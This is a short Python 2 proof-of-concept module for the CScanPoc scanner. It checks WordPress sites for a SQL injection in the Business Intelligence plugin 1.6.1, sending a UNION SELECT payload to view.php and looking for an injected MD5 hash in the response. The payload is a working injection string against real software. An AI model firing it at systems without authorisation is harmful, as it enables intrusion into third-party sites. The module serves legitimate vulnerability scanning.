# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0050'  # 平台漏洞编号，留空
    name = 'WordPress Business Intelligence 插件SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        https://www.exploit-db.com/exploits/36600/
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36600/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Business Intelligence 1.6.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e091e85d-e661-40fb-94c6-52d1e0ab2b7d'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wp-content/plugins/wp-business-intelligence/view.php?t=1337+union+select+1,2,3,md5(521521),5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+"
            url = arg + payload
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and '35fd19fbe470f0cb5581884fa700610f' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
